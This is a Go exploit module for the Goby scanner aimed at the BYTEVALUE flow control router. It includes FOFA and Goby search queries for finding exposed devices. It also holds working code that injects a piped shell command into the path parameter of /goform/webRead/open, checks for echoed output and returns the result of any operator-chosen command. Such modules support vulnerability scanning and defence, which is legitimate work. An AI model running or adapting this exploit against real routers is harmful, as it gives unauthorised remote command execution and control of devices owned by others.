package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "BYTEVALUE intelligent flow control router open routing path parameter command execution vulnerability",
    "Description": "<p>BYTEVALUE flow control router is a multi-functional router that pursues bandwidth utilization.</p><p>There is an echoed command injection vulnerability in the ?path parameter of the /goform/webRead/open route of BYTEVALUE flow control router.</p>",
    "Product": "BYTEVALUE-Intelligent-FCR",
    "Homepage": "http://www.bytevalue.com/",
    "DisclosureDate": "2023-02-25",
    "Author": "715827922@qq.com",
    "FofaQuery": "title=\"BYTEVALUE 智能流控路由器\" && body=\"<a href=\\\"http://www.bytevalue.com/\\\" target=\\\"_blank\\\">\"",
    "GobyQuery": "title=\"BYTEVALUE 智能流控路由器\" && body=\"<a href=\\\"http://www.bytevalue.com/\\\" target=\\\"_blank\\\">\"",
    "Level": "3",
    "Impact": "<p>An attacker can use this vulnerability to execute commands on the server side, write a backdoor, obtain server permissions, and then control the entire router.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.bytevalue.com/\">http://www.bytevalue.com/</a></p><p/><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "http://www.bytevalue.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "百为智能流控路由器 open 路由 path 参数命令执行漏洞",
            "Product": "BYTEVALUE-智能流控路由器",
            "Description": "<p>BYTEVALUE 百为流控路由器是一款追求带宽利用率的多功能路由器。<br></p><p>百为智能流控路由器 /goform/webRead/open 路由的 ?path 参数存在有回显的命令注入漏洞。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.bytevalue.com/\">http://www.bytevalue.com/</a></p><p><br></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端执行命令，写入后门，获取服务器权限，进而控制整个路由器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "BYTEVALUE intelligent flow control router open routing path parameter command execution vulnerability",
            "Product": "BYTEVALUE-Intelligent-FCR",
            "Description": "<p>BYTEVALUE flow control router is a multi-functional router that pursues bandwidth utilization.</p><p>There is an echoed command injection vulnerability in the ?path parameter of the /goform/webRead/open route of BYTEVALUE flow control router.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.bytevalue.com/\">http://www.bytevalue.com/</a></p><p><br></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>An attacker can use this vulnerability to execute commands on the server side, write a backdoor, obtain server permissions, and then control the entire router.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10836"
}`
	sendPaylaod70c7964d := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/goform/webRead/open/?path=|" + url.QueryEscape(cmd))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			rsp, err := sendPaylaod70c7964d(u, "echo "+checkStr)
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo "+checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := goutils.B2S(ss.Params["cmd"])
			rsp, err := sendPaylaod70c7964d(expResult.HostInfo, cmd)
			if err != nil || rsp.StatusCode != 200{
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output = rsp.Utf8Html
			return expResult
		},
	))
}
